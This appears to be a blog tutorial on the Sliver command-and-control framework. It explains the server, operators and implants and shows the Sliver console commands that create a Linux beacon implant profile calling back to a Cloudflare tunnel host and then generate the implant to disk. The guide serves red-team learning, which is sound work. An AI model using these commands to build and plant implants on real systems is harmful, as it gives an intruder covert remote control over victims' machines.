# Learn Sliver C2: A Practical Guide

## Introduction

Sliver C2 is an open-source framework created by Bishop Fox. Big shoutout to the creators first, because I honestly love this tool and use it most of the time. Why? Because I can manage it from the terminal, it works smoothly, and it’s easy to debug if anything goes wrong. You can quickly understand what’s wrong and where.

Some of the things I like about this tool:

* **Written entirely in Go (Golang)**, producing **single statically linked binaries** that don’t require any external runtime dependencies.
* **Cross-compilation is simple** thanks to Go’s toolchain. You can build for **Windows, Linux, and macOS**, across both **x86 and ARM architectures**, from the same codebase.
* **Completely open source**, so there’s no need for cracked or pirated versions. You can **audit the code, customize it, and extend it**, which makes it especially useful for researchers and security engineers who want to understand or modify how things work internally.

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

## Architecture

<figure><img src=".gitbook/assets/ChatGPT Image Sep 10, 2026, 11_06_44 AM.png" alt=""><figcaption></figcaption></figure>

At a high level, the Sliver architecture is pretty straightforward. We have **operators**, the **Sliver server**, and the **implants/slivers** running on the target.

#### Operators

The operators interact with the Sliver server through the `sliver-client`. In a multiplayer setup, multiple operators can connect to the same server.

The connection between the clients and the server uses **mTLS / gRPC**.

#### Sliver Server

The **Sliver Server** is the central part of the architecture. It handles the main C2 functionality and contains a few important components.

**BoltDB** is used for persistence, storing things such as implants, tasks, and loot.

The server also manages the **listeners**, which can use different protocols such as **mTLS, HTTPS, DNS, and WireGuard**.

There is also the **outbound C2** side, which is responsible for the communication between the server and the implants.

**Implants / Slivers**

The **implant**, also called a **Sliver**, runs on the target system and communicates with the Sliver server through an outbound connection.

Sliver supports two main modes for implants:

* **Session Mode** — provides a real-time and interactive connection.
* **Beacon Mode** — communicates periodically instead of maintaining a continuous connection.

For this example, I will create a **Beacon payload** using a Cloudflare Tunnel. You can also use your local IP address if the target is on the same network.

By default, Sliver generates a **session** implant. If you want to generate a session payload, simply remove the `beacon` keyword from the command.

```bash
profiles new beacon  --http https://intend-weighted-guy-degree.trycloudflare.com --os linux beaconshell
```

To check whether the profile was created successfully, run:

```bash
profiles
```

You should see your new profile listed, including its implant type, platform, and C2 configuration.

Next, generate the payload using the profile:

```bash
profiles generate --save /mnt/c/Users/Amir/Desktop/learn/sliver/payload beaconshell
```

Sliver will then generate the implant based on the settings defined in the `beaconshell` profile.

> **Note:** Sliver is a large framework, so I can't cover every command and option in this blog. If you quickly want to check the syntax or available flags for a command, you can use the following format:

<pre class="language-bash"><code class="lang-bash"><strong>#syntaxe
</strong><strong>[command] --help 
</strong><strong># Check profile options
</strong>profiles --help
# Check the generate command
generate --help
</code></pre>

I also encourage you to read the [official Sliver documentation](https://sliver.sh/docs?utm_source=chatgpt.com) for more details about the framework and all available options.



